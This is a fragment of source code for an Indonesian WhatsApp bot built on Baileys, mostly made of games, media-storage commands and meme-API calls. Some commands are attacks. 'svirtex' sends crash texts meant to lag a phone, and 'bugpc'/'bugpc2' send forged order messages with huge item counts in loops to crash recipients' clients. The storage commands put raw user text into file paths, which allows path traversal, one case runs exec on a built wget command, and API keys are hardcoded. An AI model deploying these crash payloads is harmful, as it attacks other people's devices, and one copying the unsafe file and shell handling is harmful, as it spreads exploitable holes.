					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case "sangecek":
					// ⚠️ Case by DappaUhuy&YogPw
if (isBanned) return reply(mess.ban)
                 
					sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
case "gaycek":
  if (isBanned) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

              
					gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
////Akhir
/////////===============///////////////////////////CASE STORAGE!!///////////////
case 'addvideo':
				//Fix By M4N1K
          
					if (!isQuotedVideo) return reply('Reply videonya blokk!')
					svst = body.slice(10)
					if (!svst) return reply('Nama videonya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					videonye.push(`${svst}`)
					fs.writeFileSync(`./strg/video/${svst}.mp4`, delb)
					fs.writeFileSync('./strg/video.json', JSON.stringify(videonye))
					syaa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: mek })
					break
					
				case 'getvideo':
				//Fix By M4N1K
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/video/${namastc}.mp4`)
					syaa.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: mek })
					break
					
				case 'listvideo':
				case 'videolist':
				//Fix By M4N1K
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": videonye } })
					break
case 'getsticker':
				case 'gets': 
				  
					namastc = body.slice(12)
					result = fs.readFileSync(`./strg/stiker/${namastc}.webp`)
					syaa.sendMessage(from, result, sticker, {quoted :mek})
					break
                case 'stickerlist':
				case 'liststicker': 
				  
					teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
                case 'addsticker':
                case 'addstiker':
				
					if (!isQuotedSticker) return reply('Reply stiker nya')
					svst = body.slice(12)
					if (!svst) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					setiker.push(`${svst}`)
					fs.writeFileSync(`./strg/stiker/${svst}.webp`, delb)
					fs.writeFileSync(`./strg/stik.json`, JSON.stringify(setiker))
					syaa.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, { quoted: mek })
					break
case 'addupdate': 
					svst = body.slice(11)
					if (!svst) return reply('Nama fiturnya apa su?')
					
					fs.writeFileSync('./database/video.json', JSON.stringify(fiturnye))
					syaa.sendMessage(from, `Sukses Menambahkan Fitur, cek di /listfitur`, MessageType.text, { quoted: mek })
					break
case 'listfitur':
				case 'fiturlist': 
				
					teks = '*List Fitur:*\n\n'
					for (let awokwkwk of fiturnye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${fiturnye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": fiturnye } })
					break
case 'addvn': 
  if (!svst) return reply('Nama audionya apa su?')
					svst = body.slice(7)
					if (!svst) return reply('Nama audionya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./strg/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./strg/audio.json', JSON.stringify(audionye))
					syaa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: mek })
					break
			
				case 'listvn':
				case 'vnlist': 
				
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
case 'getvn': 
          
					namastc = body.slice(7)
					buffer = fs.readFileSync(`./strg/audio/${namastc}.mp3`)
					syaa.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
					break
case 'addimage':
				//Fix By M4N1K
          
					if (!isQuotedImage) return reply('Reply imagenya blokk!')
					svst = body.slice(10)
					if (!svst) return reply('Nama imagenya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./strg/image/${svst}.jpeg`, delb)
					fs.writeFileSync('./strg/image.json', JSON.stringify(imagenye))
					syaa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: mek })
					break
					
				case 'getimage':
				//Fix By M4N1K
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/image/${namastc}.jpeg`)
					syaa.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
					break
					
				case 'imglist':
				case 'listimg':
				//Fix By M4N1K
					teks = '*List Image :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
////atm&limit
case "limit":
				// Fix Case By Yogi/Hans⛔
                 
				checkLimit(sender)
				break
             
////slot2 by manik
case 'slot':
            case 'slots':
              if (isBanned) return reply(mess.ban)
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            syaa.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy} <=====||\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
            sendButMessage(from, `Mau main lagi?`, `Pencet tombol di bawah`, [
          {
            buttonId: `${prefix}slot`,
            buttonText: {
              displayText: `Play Again`,
            },
            type: 1,
          },
        ]);
            break;
///////Slot
/*TEST TOD NYA WISNUUUUU GES*/
case "tod":
  if (isBanned) return reply(mess.ban)
					 var arasyagans =` ${pushname} mau yg truth or dare?\n\npilih tombol di bawah `
					sendButImage(from, arasyagans, "Case By @iamghosky_", thumb, [
          {
            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `Truth`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `Dare`
            },
            type: 1,
          },
 ]);
 break
/*TEST COMMAND*/
///////////////////////////////A================\\\\\\\\\\\\aAKHR
case 'citacita':
  if (isBanned) return reply(mess.ban)
              const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']

              const cita3 = cita[Math.floor(Math.random() * cita.length)]
              cita2 = await getBuffer(cita3)
              syaa.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: mek})
              break
///Case by rame
case 'shortlink':
				if (isBanned) return reply(mess.ban)
				syaa.updatePresence(from, Presence.composing) 
				urlnya = body.slice(11)
				data = await fetchJson(`https://hujanapi.herokuapp.com/api/cuttly?url=${args[0]}&apikey=trial2k21`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.Short}`
				reply(hasil)
				await limitAdd(sender)
				break
case 'fftext': 				
				if (isBanned) return reply(mess.ban)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti DappaUhuy`)
				reply(mess.wait)
				ct = body.slice(8)
				dapuhy = await getBuffer(`https://hujanapi.herokuapp.com/api/fftext?text=${ct}&hero=Kelly&apikey=trial2k21`)
				syaa.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Follow Ig rsyarfi_.04' })
				break
case 'kbbi':	
        if (isBanned) return reply(mess.wait)
				if (args.length < 1) return reply('Apa yang mau dicari di kbbi kak?')
				selepi = body.slice(6)
				anu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/info/kbbi?kata=${selepi}&apikey=hardianto`, {method: 'get'})
				reply('Menurut Kbbi:\n\n'+anu.result.arti)
				break
case 'spongebobm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/knights/spongebob?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'hengkerm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/beta/hacker2?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'hengkerm2':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/beta/hacker3?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'ripm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/rip?image=${anu.display_url}&apikey=hardianto`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'stonkm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/stonk?image=${anu.display_url}&apikey=hardianto`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'notstonkm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/not-stonk?image=${anu.display_url}&apikey=hardianto`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'patrickm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/knights/patrick?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'ocr':
				if (isBanned) return reply(mess.wait)
				reply(mess.wait)
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await syaa.downloadAndSaveMediaMessage(encmedia)
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply('Foto aja gan Jangan Video')
					}
					await limitAdd(sender) 
					break
case "suit":
  if (isBanned) return reply(mess.ban)
  sendButMessage(from, `Pilih Gunting Kertas Atau Batu`, `case By @𝕀𝕂𝕐`, [
          {
            buttonId: `${prefix}sutit batu`,
            buttonText: {
              displayText: `BATU`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit gunting`,
            buttonText: {
              displayText: `GUNTING`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit kertas`,
            buttonText: {
              displayText: `KERTAS`,
            },
            type: 1,
          },
        ]);
        break
case 'sutit':
  if (isBanned) return reply(mess.ban)
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
case "gay":
  if (isBanned) return reply(mess.ban)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply("Loading....")
  owgi = await syaa.downloadAndSaveMediaMessage(ger)
  anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi)
  teks = `${anu.display_url}`
  ranp = getRandom('.gif')
  rano = getRandom('.webp')
  anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
  exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (e) => {
fs.unlinkSync(ranp)
if (e) return reply('Hadeh Emror:V')
nobg = fs.readFileSync(rano)
syaa.sendMessage(from, nobg, sticker, {
  quoted: mek
})
fs.unlinkSync(rano)
  })

} else {
  reply('Gunakan foto!')
}
break

case 'readall':
              totalchat.map( async ({ jid }) => {
              await syaa.chatRead(jid)
})
              reply(`\`\`\`Berhasil membaca Seluruh Chat !\`\`\``)
              console.log(totalchat.length)
              break	
case 'wangy':
  if (isBanned) return reply(mess.ban)
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
 case "virtex":
   if (isBanned) return reply(mess.ban)
sendButMessage(from, `Virtex ini akan membuat hape kamu lagg,
Silahkan pilih, apakah kamu mau aku kirim virtex?`, `Virtex By @𝕀𝕂𝕐`, [
          {
            buttonId: `${prefix}svirtex`,
            buttonText: {
              displayText: `YA`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}dpwkdwk`,
            buttonText: {
              displayText: `TIDAK`,
            },
            type: 1,
          },
        ]);
       case "slebewbewbew":
         fakegroup(`Baiklah bot tidak akan kirim kamu virtex`)
			  break
case 'svirtex':
if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
reply(`${ngazap(prefix)}`)
reply(`${emoji2(prefix)}`)
reply(`${virtex(prefix)}`)
reply(`${virtex2(prefix)}`)
reply(`${virtex3(prefix)}`)
reply(`${virtex4(prefix)}`)
reply(`${virtex5(prefix)}`)
reply(`${virtex6(prefix)}`)
reply(`${virtex7(prefix)}`)
reply(`${virtex8(prefix)}`)
reply(`${virtex9(prefix)}`)
reply(`${virtag(prefix)}`)
break
case "report":
          			
          				const kontil = body.slice(8)
                      if (kontil.length > 300) return syaa.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: mek})
                        var tonmor = mek.participant
                       const buseh = `*[BUG REPORT]*\nNomor : @${tonmor.split("@s.whatsapp.net")[0]}\nPesan : ${kontil}`

                      var options = {
                         text: buseh,
                         contextInfo: {mentionedJid: [tonmor]},
                     }
                    syaa.sendMessage('6283102774416@s.whatsapp.net', options, text, {quoted: mek})
                    reply('LAPORAN ANDA TELAH SAMPAI ke owner BOT, Laporan palsu/main2 tidak akan ditanggapi.')
                    break
case "say":
  if (isBanned) return reply(mess.ban)
              teks = body.slice(5)
              if (args.length < 1) return reply('teksnya mana kak?')
              saying = teks
                 syaa.sendMessage(from, saying, text)
              break
var c = '```'
/*case "tagall":
					if (!isGroup) return reply("Khusus di grup");
					if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += ` *→*  @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break*/
					case 'ban':
				if (!isOwner && !mek.key.fromMe) return reply(mess.own)
				bnnd = body.slice(5)
				ban.push(`${args[0].replace('@','')}@s.whatsapp.net`)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
case 'unban':  
					
					if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
					delp = body.slice(7)
					ban.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					reply(`Berhasil Menghapus wa.me/${delp} dari banned`)
					break
case 'listban':
		case 'banlist'://By M4N1K
					teks = '*List Ban:*\n\n'
					for (let manikgans of ban) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${ban.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": ban } })
					break
case 'addprem':  
					if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
					adprem = `${args[0].replace('@','')}@s.whatsapp.net`
					prem.push(adprem)
					fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
					reply(`BERHASIL MENAMBAHKAN USER PREMIUM`)
					break				
		case 'dellprem':  
					
					if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
					delp = body.slice(10)
					prem.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
					reply(`Berhasil Menghapus wa.me/${delp} Dari Daftar Premium`)
					break
		case 'listprem':
		case 'premlist'://By M4N1K
					teks = '*List Premium:*\n\n'
					for (let manikgans of prem) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${prem.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": prem } })
					break
case 'getpic':
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return 
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Siap Boss')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
						try {
						pp = await syaa.getProfilePicture(mentioned)
						buffer = await getBuffer(pp)
						
						syaa.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					} catch (e) {
						syaa.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					}
				break
case 'kbbi':	
                if (isBanned) return reply(mess.ban)
				if (args.length < 1) return reply('Apa yang mau dicari di kbbi kak?')
				
				anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kbbi?kata=${body.slice(6)}&apikey=Alphabot`, {method: 'get'})
				reply('Menurut Kbbi:\n\n'+anu.result.arti)
				break
if(budy.match('Assalamualaikum')){
result = fs.readFileSync(`./strg/stiker/Waalaikumsalam.webp`)
  syaa.sendMessage(from, result, sticker, { quoted: mek })
                  }
case "bugpc":
					case "bugpc":
if (isBanned) return reply(mess.ban)
syaa.updatePresence(from, Presence.composing)
syaa.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `Test`,
    orderTitle: `Test bro`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case "bugpc2":
  if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
syaa.sendMessage(from, `Arasyaa`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `Arasyaa`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
case 'isbaileys': 
case 'bail': 
case 'baileys':
reply(`${mek.quoted.isBaileys}`)
break
case 'tag':
  if (isBanned) return reply(mess.ban)
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					syaa.sendMessage(from, tagq, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
			  if (isBanned) return reply(mess.ban)
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					syaa.sendMessage(from, tagu, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
case 'nuliskanan':
  if (isBanned) return reply(mess.ban)
if (!c) return reply('Textnya mana gan?')
reply(mess.wait)
kon = (`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${c}&apikey=hardianto`)
anu = await getBuffer(kon)
syaa.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./stik/fake.jpeg')})
break
case 'naruto':
reply(mess.wait)
budi = body.slice(8)
kon = (`https://hardianto-chan.herokuapp.com/api/photooxy/naruto?apikey=hardianto&text=${budi}`)
anu = await getBuffer(kon)
syaa.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./stik/fake.jpeg')})
break
					case "narutopekok":
					  if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix}coffecup Arasya`)
